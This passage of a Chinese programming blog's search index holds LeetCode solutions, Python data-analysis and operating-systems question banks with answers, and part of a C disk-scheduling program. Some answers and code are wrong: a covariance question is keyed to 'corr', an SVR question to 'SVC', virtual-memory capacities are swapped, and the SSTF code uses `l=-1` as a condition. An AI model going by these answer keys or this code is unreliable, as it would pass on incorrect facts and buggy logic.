的前五个元素被修改为 0, 1, 2, 3, 4 。不需要考虑数组中超出新长度后面的元素。 提示： 0 &lt;= nums.length &lt;= 3 * 104 -104 &lt;= nums[i] &lt;= 104 nums 已按升序排列 题解123456789101112131415161718int removeDuplicates(int* nums, int numsSize)&#123; if(nums==NULL||numsSize==0) return 0;//判断是否为空数组 int left = 0; for(int right = 1;right &lt; numsSize;right++)&#123; //if(nums[left]==nums[right]) //right++; //如果相同，左指针不动，右指针移动。因为for循环有右指针移动，故省去这步right++； if(nums[left]!=nums[right]) &#123; left++; nums[left]=nums[right]; &#125; //如果不相同，左指针移动，右指针将自己的值赋给左指针，再移动。 &#125; return ++left;&#125; 一些理解题中说明了数组内部已经排序 好。所以如果有重复元素，那他们一定是相邻的。故使用双指针来解决问题。只需要遍历一遍数组即可。 存在重复元素给定一个整数数组，判断是否存在重复元素。 如果存在一值在数组中出现至少两次，函数返回 true 。如果数组中每个元素都不相同，则返回 false 。 示例112输入: [1,2,3,1]输出: true 示例212输入: [1,2,3,4]输出: false 示例312输入: [1,1,1,3,3,4,3,2,4,2]输出: true 题解1234567891011121314151617class Solution &#123;public: bool containsDuplicate(vector&lt;int&gt;&amp; nums) &#123; sort(nums.begin(),nums.end()); int left = 0; for(int right = 1;right &lt; nums.size();right++)&#123; if(nums[left]==nums[right]) return true; if(nums[left]!=nums[right]) &#123; left++; nums[left]=nums[right]; &#125; &#125; return false; &#125;&#125;; 一些理解此题查重思路同第1题相同。只是要先排序。注意在for循环中的两个if语句顺序不能写颠倒了。 更好的解法我们知道set集合中的元素是不能有重复的，在添加的时候如果有重复的，会把之前的值给覆盖，并且返回false。我们遍历数组中的所有值，一个个添加到集合set中，在添加的时候如果返回false，就表示有重复的，直接返回true。 public boolean containsDuplicate(int[] nums) &#123; Set&lt;Integer&gt; set = new HashSet&lt;&gt;(); for (int num : nums) &#123; //因为集合set中不能有重复的元素，如果有重复的 //元素添加，就会添加失败 if (!set.add(num)) return true; &#125; return false; &#125; 拿硬币桌上有 n 堆力扣币，每堆的数量保存在数组 coins 中。我们每次可以选择任意一堆，拿走其中的一枚或者两枚，求拿完所有力扣币的最少次数。 示例 1：123输入：[4,2,1]输出：4 解释：第一堆力扣币最少需要拿 2 次，第二堆最少需要拿 1 次，第三堆最少需要拿 1 次，总共 4 次即可拿完。 示例 2：123输入：[2,3,10]输出：8 限制： 1 &lt;= n &lt;= 4 1 &lt;= coins[i] &lt;= 10 题解1234567891011class Solution &#123;public: int minCount(vector&lt;int&gt;&amp; coins) &#123; int ans=0; for(int i=0;i&lt;coins.size();i++) &#123; ans+=(coins[i]+1)/2; &#125; return ans; &#125;&#125;; 一些理解一枚硬币也要拿一次，两枚硬币也要拿一次。那么就权当拿两枚。 作者：力扣 (LeetCode)链接：https://leetcode-cn.com/来源：力扣（LeetCode）","comments":true,"categories":[{"name":"计算机基础","slug":"计算机基础","permalink":"http://1905060202.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"leetcode","slug":"leetcode","permalink":"http://1905060202.github.io/tags/leetcode/"},{"name":"算法","slug":"算法","permalink":"http://1905060202.github.io/tags/%E7%AE%97%E6%B3%95/"},{"name":"c/c++","slug":"c-c","permalink":"http://1905060202.github.io/tags/c-c/"}]},{"title":"python与数据分析题库","date":"2021-07-06T15:59:50.000Z","path":"2021/07/06/python与数据分析题库/","text":"第一章 Python与数据分析一、选择题 数据分析第三方库包括（ A B C ） A. NumPy B. Matplotlib C. Pandas D. Pygame 不是数据分析常用工具的是（ B ） A. Python B. Java C. MATLAB D. R 二、填空题 数据分析流程包括： 需求分析、数据获取、数据预处理、分析与建模、模型评价与优化、部署 等环节。 广义的数据分析包括 狭义数据分析 、 数据挖掘 两部分。 三、简单题 Python数据分析的优势。 答：1. 语法简单精炼。比起其他编程语言，Python更容易学习和使用。 功能强大的库。大量优秀好用的第三方库，扩充了Python功能，提升了Python的能力，使Python如虎添翼。 功能强大。Python是一个混合体，丰富的工具使它介于传统的脚本语言和系统语言之间。Python不仅具备简单易用的特点，还提供了编译语言所具有的软件工程能力。 不仅适用于研究和原型构建，同时也适用于构建生产系统。研究人员和工程技术人员使用同一种编程工具，会给企业带来显著的组织效益，并降低企业的运营成本。 Python是一门胶水语言。Python程序能够以多种方式轻易地与其他语言的组件“粘接”在一起，例如Python的C语言API可以帮助Python程序灵活地调用C程序。因此可以根据需要给Python程序添加功能，或者其他环境系统中使用Python。 Python数据分析环境搭建。 答：1. 安装Python 安装数据分析库 （1）安装第三方数据分析库 第三方库的安装使用pip3命令，如下所示。 pip3 install numpy pip3 install scipy pip3 install matplotlib pip3 install sklearn pip3 install xlrd pip3 install openpyxl pip3 install seaborn Jupyter Notebook的使用 Jupyter Notebook是IPython Notebook的继承者，是一个交互式笔记本，支持运行40多种编程语言。它本质上是一个支持实施代码、数学方程、可视化和Markdown的Web应用程序。对于数据分析，Jupyter Notebook最大的优点是可以重现整个分析过程，并将说明文字、代码、图表、公式和结论都整合在一个文档中。用户可以通过电子邮件、Dropbox、GitHub和Jupyter Notebook Viewer将分析结果分享给其他人。 Jupyter Notebook是一个非常强大的工具，常用于交互式地开发和展示数据科学项目。它将代码和它的输出集成到一个文档中，并且结合了可视的叙述性文本、数学方程和其他丰富的媒体。它直观的工作流促进了迭代和快速的开发，使得Jypyter notebook 在当代数据科学、分析和越来越多的科学研究中越来越受欢迎。最重要的是，作为开源项目，它是完全免费的。 第二章 NumPy数值计算一、单选题 不是NumPy数组创建的函数是（ D ）。 A. array B. ones_like C. eye D. reshape 能够产生正态分布的样本值的函数是（ C ）。 A. rand B. randint C. randn D. seed 求数组转置的除了使用transpose函数外，还可以使用数据的（ A ）属性。 A. T B. shape C. size D. dtype 二、填空题 分割数组的函数有 split 、 hsplit 、 vsplit 。 求数组的标准差函数是 std ，方差函数是 var 。 求矩阵特征值和特征向量的函数是 eigvals() 、 eig() 。 三、简答题 函数unique的参数。 答： 参数arr：输入数组，如果不是一维数组则会展开。 return_index：如果为true，返回新列表元素在旧列表中的位置（下标），并以列表形式储。 return_inverse：如果为true，返回旧列表元素在新列表中的位置（下标），并以列表形式储。 return_counts：如果为true，返回去重数组中的元素在原数组中的出现次数。 数组可以广播的条件。 答： 数组拥有相同形状。 数组拥有相同的维数，每个维度拥有相同长度，或者长度为 1。 数组拥有极少的维度，可以在其前面追加长度为 1 的维度，使上述条件成立。 函数sort的排序算法。 答： 种类 排序算法 最坏情况 ‘quicksort’ 快速排序 O(n^2) ‘mergesort’ 归并排序 O(n*log(n)) ‘heapsort’ 堆排序 O(n*log(n)) 四、读程序 程序执行结果是 。 import numpy as np a = np.arange(12).reshape(2,6) c = a.ravel() c[0]=100 print(a) 程序执行结果是 。 import numpy as np a = np.arange(9) b = np.split(a,3) print (b) 程序执行结果是 。 import numpy as np a = np.array([[1,2,3],[4,5,6]]) print(np.append(a, [7,8,9])) print(np.append(a, [[7,8,9]],axis = 0)) print(np.append(a, [[5,5,5],[7,8,9]],axis = 1)) 程序执行结果是 。 import numpy as np a = np.array([5,2,6,2,7,5,6,8,2,9]) u = np.unique(a) u,indices = np.unique(a, return_index = True) print(indices) u,indices = np.unique(a,return_inverse = True) print(u) print(indices) print(u[indices]) u,indices = np.unique(a,return_counts = True) print(u) print(indices) 程序执行结果是 。 import numpy as np a = np.array([10,100,1000]) print(np.power(a,2)) b = np.array([1,2,3]) print(np.power(a,b)) 程序执行结果是 。 import numpy as np a = np.array([[3,7],[9,1]]) print(np.sort(a)) print(np.sort(a, axis = 0)) dt = np.dtype([(‘name’, ‘S10’),(‘age’, int)]) a = np.array([(“raju”,21),(“anil”,25),(“ravi”, 17), (“amar”,27)], dtype = dt) print(np.sort(a, order = ‘name’)) 程序执行结果是 。 import numpy as np x = np.arange(100).reshape(10, 10) condition = np.mod(x,2) == 0 print(np.extract(condition, x)) 五、计算题 1.计算下列行列式 （1）= 求下列方阵的逆矩阵 （1）= （2）= 求下列线性方程组 （1）设，，求X使AX=B； （2） 无法求解。 求矩阵的特征值和特征向量。 第三章 Matplotlib数据可视化一、选择题 线形图中设置线宽的函数是（ C ） A. color B. linestyle C. linewidth D. marker 显示一个数据系列中各项的大小与各项总和的比例的图形时（ A ） A. 饼图 B. 直方图 C.柱形图 D. 散点图 图例位置upper left对应的编号是（ A ） A. 0 B. 1 C. 2 D. 3 二、填空题 绘制饼图的函数是 pie() 。 pyplot设置x坐标取值范围的函数是 xlim 。 pyplot使用rcParams设置字体的属性是 font.sans-serif 。 三、简答题 创建子图的函数。 答： subplot函数 函数subplot (nrows, ncols, plot_number)创建子图，其中参数nrows，ncols表示行数和列数，决定了子图的个数；plot_number表示当前是第几个子图。 subplots函数 函数plt.subplots(nrows=1, ncols=1, sharex=False, sharey=False, squeeze=True, subplot_kw=None, gridspec_kw=None,**fig_kw) 参数nrows和ncols表示将画布分割成几行几列。 sharex和sharey表示坐标轴的属性是否相同。 Matplotlib能够绘制哪些二维图形。 答：折线图、散点图、柱状图、条形图、饼图、直方图、线形图等。 文本注解函数。 答： （1）在任意位置增加文本 plt.text(横坐标, 纵坐标, ‘显示文字’) （2）在图形中增加带箭头的注 plt.annotate(‘文字’,xy=(箭头坐标),xytext=(文字坐标),arrowprops=dict(facecolor=’箭头颜色’)) 第四章 Pandas数据分析一、选择题 函数应用与映射函数作用于DataFrame的列的是（ A ） A pipe B apply C applymap D map 重建索引函数（ D ） A. rename B. set_index C. reset_index D. reindex 求协方差的函数是（ B ） A. pct_change B. corr C. rank D. cov 二、填空题 数据对象DataFrame的head函数的作用是 返回开头前n行 。 函数read_csv的参数sep的作用是指定 分隔符 。 数据对象DataFrame选取行的函数主要是loc函数和 iloc 函数。 透视表和交叉表的函数是 pivot_table 和 crosstab 。 三、简答题 Pandas有哪些数据结构。 答：Pandas有三种数据结构：系列(Series)、数据帧(DataFrame)和面板(Panel)，这些数据结构可以构建在NumPy数组之上。 Pandas的统计函数。 答： 函数 描述 count() 非空观测数量 sum() 所有值之和 mean() 所有值的平均值 median() 所有值的中位数 mode() 值的模值 std() 值的标准偏差 min() 所有值中的最小值 max() 所有值中的最大值 abs() 绝对值 prod() 数组元素的乘积 cumsum() 累计总和 cumprod() 累计乘积 describe 计算有关DataFrame列的统计信息的摘要 变化率使用pct_change()函数求解，系列和DatFrames都可以通过pct_change()函数将每个元素与其前一个元素进行比较，并计算变化百分比。 Panda使用cov函数求解两个Series或DataFrame的列之间的协方差。如果数据对象中出现NaN数据，将被自动排除。 相关性DataFrame.corr(method=’pearson’, min_periods=1) 数据排名为元素数组中的每个元素生成排名，使用rank函数实现，其参数axis表示按照index（默认axis=0）还是按照column（axis=1）排名，参数methon表示排名依据：average（并列组平均排序等级）、min（组中最低的排序等级）、max（组中最高的排序等级）、first（按照它们出现在数组中的顺序分配队列）。 聚合函数有哪些。 答： agg方法聚合 方法agg是比较常用的聚合方法，agg的参数可以是一个函数，也可以是多个函数组成的列表。 apply方法聚合 transform方法聚合 第五章 数据预处理一、选择题 重复值删除的函数是（ A ） A. drop_duplicates B. duplicated C. isnull D. notnull 不是数据规范化方法的是（ D ） A. 离差规范化 B. 标准差规范化 C. 小数定标规范化 D. 平均值规范化 数据重塑方法有（ D ） A. dropna B. fillna C. stack D. concat 二、填空题 数据清洗解决数据问题有 重复值 、 缺失值 、 异常值 。 虚拟变量的函数名称是 get_dummies 。 插值法包括 线性插值 、 多项式插值 、 样条插 。 函数merge的参数how取值有 left（左连接） 、 right（右连接） 、 outer（外连接） 和 inner（内连接） 。 三、简答题 缺失值处理方法。 答： （1）删除法 （2）固定值替换法 （3）填充法 （4）插值法 数据合并连接与重塑的函数。 答： pd.merge(left, right, how=’inner’, on=None, left_on=None, right_on=None, left_index=False, right_index=False, sort=True, suffixes=(‘_x’,’_y’)) DataFrame内置的join方法是一种快速合并的方法。它默认以index作为对齐的列。左右两个DataFrame具有重复列时需要指定重复列的前缀，加以分区，使用lsuffix和rsuffix实现。 pd.concat(objs, axis=0, join=’outer’, join_axes=None, ignore_index=False, ​ keys=None, levels=None, names=None, verify_integrity=False) combine_first合并 数据重塑是将DataFrame的行或列进行旋转的操作，函数stack将DataFrame的列旋转为行，unstack将DataFrame的行旋转为列。 数据变换种类有哪些。 答： 虚拟变量 函数变换 连续属性离散化 规范化 随机采样 第六章 机器学习一、选择题 监督学习包括（ B、C ） A. 降维 B. 回归 C. 分类 D. 聚类 鸢尾花数据集属于（ A ） A. load数据集 B. make数据集 C. 可在线下载的数据集 D. svmlight/libsvm格式的数据集 数据集拆分为训练集和测试集的函数是（ D ） A. cross_val_score B. PCA C. score D. train_test_split 支持向量机用来回归分析的算法是（ B ） A. SVM B. SVC C. SVR D. SVN 二、填空题 机器学习可以分为监督学习和 无监督学习 。 数据预处理的模块是 preprocessing 。 函数sklearn .decomposition.PCA(n_components=’mle’,whiten=False,svd_solver=’auto’)中参数n_components取值’mle’用MLE算法根据特征的 方差分布情况 选择一定数量的主成分特征来降维。 三、简答题 朴素贝叶斯。 答：朴素贝叶斯是基于贝叶斯定理与特征条件独立假设的分类方法。最为广泛的两种分类模型是决策树模型（Decision Tree Model）和朴素贝叶斯模型（Naive Bayesian Model，NBM）。 和决策树模型相比，朴素贝叶斯分类器（Naive Bayes Classifier，或NBC）发源于古典数学理论，有着坚实的数学基础，以及稳定的分类效率。同时，NBC模型所需估计的参数很少，对缺失数据不太敏感，算法也比较简单。理论上，NBC模型与其他分类方法相比具有最小的误差率。但是实际上并非总是如此，这是因为NBC模型假设属性之间相互独立，这个假设在实际应用中往往是不成立的，这给NBC模型的正确分类带来了一定影响。 模型评估。 答： 模型评估是对预测质量的评估，即模型的评价，主要有三种方法。 模型自带 score函数 使用model.score(X_test,y_test)可以获得模型的评价，其值为[0,1]之间的数，1表示最好。 参数X_test表示测试集，参数y_test表示测试集对应的值。 cross_val_score 函数cross_val_score会得到一个对于当前模型的评估得分。在该函数中最主要的参数有两个：scoring和cv。 scoring参数设定打分的方式，比如accuracy、average_precision等。 cv参数表示数据划分方式，通常默认的是KFold或者stratifiedKFold方法。 from sklearn.cross_validation import cross_val_score scores = cross_val_score(knn, X, y, scoring=’accuracy’) 评估函数 Sklearn预定义了一些评估函数，这些评估函数也可以用来设置corss_val_score的scoring的值，也可以调函函数名称获取评估值。 聚类分析。 答： 聚类分析指将物理对象或抽象对象的集合分组为由类似的对象组成的多个类的分析过程。聚类分析的目标就是在相似的基础上收集数据来分类。聚类源于很多领域，包括数学、计算机科学、统计学、生物学和经济学等。 聚类与分类的不同在于聚类所要求划分的类是未知的。 聚类是将数据分类到不同的类或者簇这样的一个过程，所以同一个簇中的对象有很大的相似性，而不同簇间的对象有很大的相异性。 从统计学的观点看，聚类分析是通过数据建模简化数据的一种方法。传统的统计聚类分析方法包括系统聚类法、分解法、加入法、动态聚类法、有序样品聚类、有重叠聚类和模糊聚类等；目前流行的是K-均值、K-中心点等人工智能的聚类分析算法。 聚类分析是一种探索性的分析，能够从样本数据出发，自动进行分类。聚类分析所使用方法的不同，常常会得到不同的结论。 Sklearn实现了多种聚类算法，如表6-6所示。 表6-6 常用聚类算法 序号 函数名称 参数 距离度量 1 K-Means 簇数 点之间距离 2 Spectral clustering 簇数 图距离 3 Ward hierarchical clustering 簇数 点之间距离 4 Agglomerative clustering 簇数、连接类型、距离 任意成对点线图间的距离 5 DBSCA 半径大小、最低成员数目 最近的点之间的距离 6 Birch 分支因子、阈值、可选全局集群 点之间的欧式距离 致谢：感谢老王提供的资源 ©老王","comments":true,"categories":[{"name":"数据分析","slug":"数据分析","permalink":"http://1905060202.github.io/categories/%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90/"}],"tags":[{"name":"python","slug":"python","permalink":"http://1905060202.github.io/tags/python/"},{"name":"习题","slug":"习题","permalink":"http://1905060202.github.io/tags/%E4%B9%A0%E9%A2%98/"}]},{"title":"操作系统题库","date":"2021-07-06T15:20:58.000Z","path":"2021/07/06/操作系统题库/","text":"虚拟内存方案为页表项使用了一个特殊的高速缓存，通常称为（ 转换检测缓冲区（TLB） ）。 根据操作系统内核是否能感知线程，可以把线程分为两类，其中（ 用户级线程 ）对程序员来说是可见的，而对内核来说却是不可见的。 当系统采用资源有序分配的方法预防死锁时，它破坏了死锁的必要条件中的（循环等待 ）条件 处理多个中断有两种方法，分别是（ 顺序处理 ）和（嵌套处理 ）； 页表项中有一个控制位用来表示当前页是否在内存中，它叫做（ 存在位 ），当此控制位未置位时，产生一次内存访问故障，称为（ 缺页中断 ） 在最高响应比优先调度算法中，当各个进程的等待时间相同时，( 服务时间长 ) 的进程将优先调度；当各进程的服务时间相同时，( 等待时间长 ) 的进程将优先调度。 两级存储器提高性能的理论基础是 （局部性原理 ） 。 处理死锁通常有三种方法 （静态预防 ） 、 （动态避免 ） 、 （ 动态检测及解除 ） 。 现代操作系统进程管理的基本功能是 （创建 ） 、 （ 管理 ）、 （ 终止 ） 进程。 对I/O操作可能的三种技术 （ 程序I/O ）、（中断I/O ）、（ DMA ） 。 简述进程切换与模式切换的区别。 模式切换是用户态和内核态之间的切换，因为他们的资源是共享的，所以效率高并且不改变正在运行的进程的状态。进程切换是一个正在运行的进程被中断，操作系统指定另一个进程为运行态，并把控制权交给这个进程。进程切换可以在操作系统从当前正在运行的进程中获得控制权的任何时刻发生，由于进程之间不同状态的切换，需要重新分配各种资源，操作系统需要做更多的工作。 12.简述DMA概念DMA是直接存储器访问技术，其功能由系统总线中的一个独立模块完成或并入到一个I/O模块。当CPU需要读写一块数据时，它给DMA模块发出一条命令，然后断续处理其他工作。DMA模块直接与存储器交互，此进程无需CPU参与，传送完毕之后，DMA发送中断信号给CPU。 请列举两种常用的页面置换算法，并简要说明其算法思想和优缺点。 最佳置换OPT：选择置换下次访问距当前时间最长的那些页。OPT能导致最少的缺页中断，但是由于它要求操作系统必须知道将来的事件，显然这是不可能实现的。但是它仍然能作为一种标准来衡量其他算法的性能。 先进先出FIFO：置换出驻留在内存中时间最长的页。FIFO是实现起来最简单的置换算法，只需要使用一个循环移动的指针。但是FIFO可能导致一些页会反复的被换入换出。 最近最少使用LRU：置换内存中上次使用距离当前最远的页。LRU的性能接近于OPT。但LRU比较难于实现，而且实现的开销比较大。 说明动态分区存储管理中的最佳和首次适配算法的执行过程，以及他们的优缺点。 最佳适配：选择与要求的大小最接近的空闲块。首次适配：从开始扫描内存，选择大小足够的第一个可用块。首次适配算法不仅是最简单的，而且通常是最快和最好的。但首次适配算法会使得内存的前端出现很多小的空闲分区，并且每当进行首次适配查找时，都要经过这些分区。最佳适配算法尽管称为“最佳”，但通常性能却是最差的。这个算法需要查找满足要求的最小块，因而它可能保证产生的碎片尽可能的小。尽管每次存储请求总是浪费最小的存储空间，但结果却使得内存中很快产生许多很小的块，这些块通常很小以至于不能满足任何内存分配请求。因此，最佳适配算法比其他算法需要更经常的进行内存压缩。 什么是进程？为什么要在操作系统中引入进程？ 进程是可并发执行且具有独立功能的程序在一个数据集合上的运行过程，它是操作系统进行资源分配和调度的基本单位。“进程”概念是人们为了使程序能够并发执行，并且能对并发的程序加以描述和控制而引入的。 简述什么是临界区？对临界区的互斥访问有哪些要求？ 对临界区的互斥访问必须满足(1)必须强制实施互斥，即只允许一个进程进入临界区 (2)一个在非临界区停止的进程不能干涉其他进程 (3)绝不允许出现需要访问临界区的进程被无限延迟的情况，即不会死锁或饥饿 (4)当没有进程在临界区中时，任何需要进入临界区的进程必须能够立即进入 (5)对相关进程的执行速度和处理器的数目没有任何要求和限制 (6)一个进程驻留在临界区中的时间必须是有限的。 使用临界资源的那一部分程序称为临界区。 处理器调度的层次有哪些？各层次的主要工作是什么？ （2）中级调度：内存和外存之间的交换。系统内存使用紧张时，把内存中暂时不能运行的进程调到外存中等待，等内存有足够的空闲空间时，再将外存上的某些具备了运行条件的就绪进程调入内存（1）高级调度：从驻留在外存后备队列中选择一个或多个作业调入内存，创建进程并放入就绪队列中，等待被调度执行。（3）低级调度：按照一定的算法从就绪队列中选择一个进程，然后将处理器分配给它。处理器调度的层次分为三级调度：高级调度、中级调度和低级调度。 一个计算机系统的虚拟存储器，其最大容量和实际容量分别由什么决定？虚拟存储器的实际容量由指令中表示地址的字长决定，也就是计算机的地址结构决定的。虚拟存储器的最大容量由主存和辅存的容量之和确定。 什么是内部碎片和外部碎片？固定分区分配、可变分区分配、分段存储管理和分页存储管理可能产生何种碎片？内碎片：在一个分区或页的内部出现的碎片(即被浪费的空间)。外碎片：在所有分区之外新增的碎片称作外部碎片。固定分区分配、分页存储管理可能产生内碎片。可变分区分配、分段存储管理可能产生外碎片 请简述FCFS (先来先服务)、RR (轮转)、SPN (最短进程优先)进程调度算法的算法思想。 (3)最短进程优先 SPN：选择预计处理时间最短的进程运行。轮转RR：以一个时间间隔（时间片）产生时钟中断，当时钟中断发生时，当前正在运行的进程被置于就绪队列中，然后基于FCFS策略选择下一个就绪进程运行。先来先服务FCFS：选择在就绪队列中存在时间最长的进程执行。 简述进程控制块的内容。 进程控制块中包含标识符、状态、优先级、程序计数器、内存指针、上下文数据、I/O状态信息、记账信息。 semWait操作和semSignal操作是如何定义的？简述当进程调用了semWait和semSignal后，它自身的进程状态的改变情况。 semWait操作：信号量减1，若值为负数，则执行semWait的进程被阻塞。否则进程继续执行。semSignal操作：信号量加1，若值小于或等于零，则被semWait操作阻塞的进程被解除阻塞。当进程调用了semWait，它自身的进程状态可能不改变，或由运行态变为阻塞态。当进程调用了semSignal，它自身的状态不变。 某杂技团进行走钢丝表演。在钢丝的A、B两端各有n名演员（n&gt;1）在等待表演。只要钢丝上无人时便允许一名演员从钢丝的一端走到另一端。现要求两端的演员交替地走钢丝，且从A端的一名演员先开始。请问，把A、B两端的演员各看作一个进程时，怎样用semWait操作和semSignal操作（PV操作）来进行控制？设置几个信号量，分别用于控制什么，信号量的初值是多少？请写出能进行正确管理的程序。 （参考答案说明：信号量的命名可以任意）设置2个信号量S1、S2。S1用于A端演员是否可以走钢丝，由于A端演员先走，S1初值为1。S2用于B端演员是否可以走钢丝，由于B端演员后走，S2初值为0.。A端： B端：semSignal(S2) semSignal(S1)semWait(S1) semWait(S2)走钢丝 走钢丝 简述进程与线程的概念。进程是具有独立功能的程序在某个数据集合上的一次执行过程。进程是系统进行资源分配和调度的一个独立单位。在现代操作系统中，资源申请的基本单位是进程，进程由程序段、数据段和PCB（进程控制块）组成。线程是进程内的一个执行实体或执行单元，是比进程更小的能独立运行的基本单位。 简述文件及文件组织的概念。 文件组织:堆、顺序文件、索引顺序文件、索引文件、直接或散列文件。文件是一组相似记录的集合，它被用户和应用程序看做一个实体，可以通过名字访问。 26.简述抢占式处理器调度和非抢占式处理器调度。 抢占式处理器调度：当前正在运行的进程可能被操作系统中断并转移至就绪态，它可能会导致较大的开销，但对所有的进程会提供较好的服务。非抢占式处理器调度：一旦进程开始运行，就不间断执行直到终止，或者为等待I/O或请求某些系统服务而阻塞自己。 简述在使用TLB的请求式分页内存管理方案中一次指令访问过程。 首先进行逻辑地址转换为页号与页内偏移，根据页号查找TLB中的页表项，如果命中，则进行地址重定位；如果TLB没有命中，则在内存中查找页表，如果当前页在内存，则将此页表项添加到TLB，并将页帧号与页内偏移拼接形成物理地址，如果当前页不在内存，则产生缺页中断，将所缺页调入内存之后，再进行地址重定位。","comments":true,"categories":[{"name":"计算机基础","slug":"计算机基础","permalink":"http://1905060202.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"操作系统","slug":"操作系统","permalink":"http://1905060202.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"},{"name":"习题","slug":"习题","permalink":"http://1905060202.github.io/tags/%E4%B9%A0%E9%A2%98/"}]},{"title":"磁盘调度算法的设计与实现","date":"2021-07-01T10:14:57.000Z","path":"2021/07/01/磁盘调度算法的设计与实现/","text":"写在前面操作系统课设的收尾 实现源码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266#include&quot;stdio.h&quot;#include&quot;stdlib.h&quot;#define maxsize 1000 //定义最大数组域//先进先出调度算法void FIFO(int array[],int m)&#123; int sum=0,j,i,now; float avg; printf(&quot;\\n 请输入当前的磁道号： &quot;); scanf(&quot;%d&quot;,&amp;now); printf(&quot;\\n FIFO 调度结果: &quot;); printf(&quot;%d &quot;,now); for(i=0; i&lt;m; i++) printf(&quot;%d &quot;,array[i]); sum=abs(now-array[0]); for(j=1; j&lt;m; j++) sum+=abs(array[j]-array[j-1]); //累计总的移动距离 avg=(float)sum/m;//计算平均寻道长度 printf(&quot;\\n 移动的总道数： %d \\n&quot;,sum); printf(&quot; 平均寻道长度： %f \\n&quot;,avg);&#125;//最短服务时间优先调度算法void SSTF(int array[],int m)&#123; int temp; int k=1; int now,l,r; int i,j,sum=0; float avg; for(i=0; i&lt;m; i++) &#123; for(j=i+1; j&lt;m; j++) //对磁道号进行从小到大排列 &#123; if(array[i]&gt;array[j])//两磁道号之间比较 &#123; temp=array[i]; array[i]=array[j]; array[j]=temp; &#125; &#125; &#125; for( i=0; i&lt;m; i++) //输出排序后的磁道号数组 printf(&quot;%d &quot;,array[i]); printf(&quot;\\n 请输入当前的磁道号： &quot;); scanf(&quot;%d&quot;,&amp;now); printf(&quot;\\n SSTF 调度结果: &quot;); if(array[m-1]&lt;=now)//判断整个数组里的数是否都小于当前磁道号 &#123; for(i=m-1; i&gt;=0; i--) //将数组磁道号从大到小输出 printf(&quot;%d &quot;,array[i]); sum=now-array[0];//计算移动距离 &#125; else if(array[0]&gt;=now)//判断整个数组里的数是否都大于当前磁道号 &#123; for(i=0; i&lt;m; i++) //将磁道号从小到大输出 printf(&quot;%d &quot;,array[i]); sum=array[m-1]-now;//计算移动距离 &#125; else &#123; while(array[k]&lt;now)//逐一比较以确定 K 值 &#123; k++; &#125; l=k-1; r=k;//确定当前磁道在已排的序列中的位置 while((l&gt;=0)&amp;&amp;(r&lt;m)) &#123; if((now-array[l])&lt;=(array[r]-now))//判断最短距离 &#123; printf(&quot;%d &quot;,array[l]); sum+=now-array[l];//计算移动距离 now=array[l]; l=l-1; &#125; else &#123; printf(&quot;%d &quot;,array[r]); sum+=array[r]-now;//计算移动距离 now=array[r]; r=r+1; &#125; &#125; if(l=-1) &#123; for(j=r; j&lt;m; j++) &#123; printf(&quot;%d &quot;,array[j]); &#125; sum+=array[m-1]-array[0];//计算移动距离 &#125; else &#123; for(j=l; j&gt;=0; j--) &#123; printf(&quot;%d &quot;,array[j]); &#125; sum+=array[m-1]-array[0];//计算移动距离 &#125; &#125; avg=(float)sum/m; printf(&quot;\\n 移动的总道数： %d \\n&quot;,sum); printf(&quot; 平均寻道长度： %f \\n&quot;,avg);&#125;///扫描算法void SCAN(int array[],int m)&#123; int sum=0; for(int i=0; i&lt;m; i++) &#123; for(int j=i+1; j&lt;m; j++) //对磁道号进行从小到大排列 &#123; if(array[i]&gt;array[j])//两磁道号之间比较 &#123; int temp=array[i]; array[i]=array[j]; array[j]=temp; &#125; &#125; &#125; for(int i=0; i&lt;m; i++) &#123; printf(&quot;%d &quot;,array[i]); &#125; printf(&quot;\\n 请输入当前的磁道号： &quot;); int now; scanf(&quot;%d&quot;,&amp;now); printf(&quot;\\n SCAN 调度结果：&quot;); int pos; for(int i=0; i&lt;m; i++) &#123; if(array[i]&gt;=now) &#123; pos=i; sum+=abs(array[i]-now); break; &#125; &#125; for(int i=pos; i&lt;m; i++) &#123; if(i!=pos) sum+=abs(array[i]-array[i-1]); printf(&quot;%d &quot;,array[i]); &#125; if(pos&gt;=1) sum+=abs(array[m-1]-array[pos-1]); for(int i=pos-1; i&gt;=0; i--) &#123; if(i) sum+=abs(array[i]-array[i-1]); printf(&quot;%d &quot;,array[i]); &#125; printf(&quot;\\n 移动的总道数：%d\\n 平均寻道长度：%f\\n&quot;,sum,1.0*sum/m);&#125;///循环扫描算法void CSCAN(int array[],int m)&#123; int sum=0; for(int i=0; i&lt;m; i++) &#123; for(int j=i+1; j&lt;m; j++) //对磁道号进行从小到大排列 &#123; if(array[i]&gt;array[j])//两磁道号之间比较 &#123; int temp=array[i]; array[i]=array[j]; array[j]=temp; &#125; &#125; &#125; for(int i=0; i&lt;m; i++) &#123; printf(&quot;%d &quot;,array[i]); &#125; printf(&quot;\\n 请输入当前的磁道号： &quot;); int now; scanf(&quot;%d&quot;,&amp;now); printf(&quot;\\n C-SCAN 调度结果：&quot;); int pos; for(int i=0; i&lt;m; i++) &#123; if(array[i]&gt;=now) &#123; pos=i; sum+=abs(array[i]-now); break; &#125; &#125; for(int i=pos; i&lt;m; i++) &#123; if(i!=pos) sum+=abs(array[i]-array[i-1]); printf(&quot;%d &quot;,array[i]); &#125; if(pos&gt;=1) sum+=abs(array[m-1]-array[0]); for(int i=0; i&lt;pos; i++) &#123; if(i) sum+=abs(array[i]-array[i-1]); printf(&quot;%d &quot;,array[i]); &#125; printf(&quot;\\n 移动的总道数：%d\\n 平均寻道长度：%f\\n&quot;,sum,1.0*sum/m);&#125;// 操作界面int main()&#123; int c; int count;//int m=0; int cidao[maxsize];//定义磁道号数组 int i=0; int b; printf(&quot;\\n --------------------------------------------------\\n&quot;); printf(&quot; 磁盘调度算法模拟&quot;); printf(&quot;\\n 